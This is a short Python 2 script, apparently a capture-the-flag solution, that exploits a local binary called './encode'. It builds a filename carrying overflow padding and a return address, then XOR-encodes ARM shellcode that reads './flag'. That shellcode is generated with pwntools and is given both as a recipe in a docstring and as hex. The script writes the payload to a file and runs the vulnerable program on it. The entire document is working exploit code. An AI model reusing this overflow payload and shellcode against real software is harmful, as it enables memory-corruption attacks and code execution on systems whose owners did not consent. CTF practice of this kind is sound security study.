#!/usr/bin/env python 
 
from subprocess import Popen, PIPE
import os

def encode():
	os.chdir("/var/www/html/")
	payload = 'A'*0x32+"\x70\x20\x02"
	filename = "encoded/file1.jpg"+payload
	"""
	# http://docs.pwntools.com/en/stable/shellcraft/arm.html
	from pwn import *
	context.arch = 'thumb'
	filename = "./flag"
	shellcode = asm(shellcraft.arm.to_thumb())
	shellcode += asm(shellcraft.read(0, 'sp', 32))
	shellcode += asm(shellcraft.arm.linux.cat(filename))
	shellcode = shellcode.encode("hex")
	print shellcode
	"""
	
	shellcode = "01308fe213ff2fe1" # shellcraft.arm.to_thumb()
	shellcode +="80ea000069464ff020024ff0030741df" # shellcraft.read(0, 'sp', 32)
	shellcode +="46f26177c4f2001780b442f62e77c6f6664780b4684681ea010182ea02024ff0050700df01464ff0010082ea02026ff000434ff0bb0700df" # shellcraft.arm.linux.cat("./flag")
	
	shellcode = shellcode.decode("hex")
	key = "concavangmauxanhlacay"
	s = ''
	for i in range(len(shellcode)):
		s += chr(ord(shellcode[i])^ord(key[i%len(key)]))
	
	open(filename,"wb").write(s)
	process = Popen(["./encode", filename], stdout=PIPE, stderr=PIPE)
	stdout, stderr = process.communicate()
	print stdout
	
encode()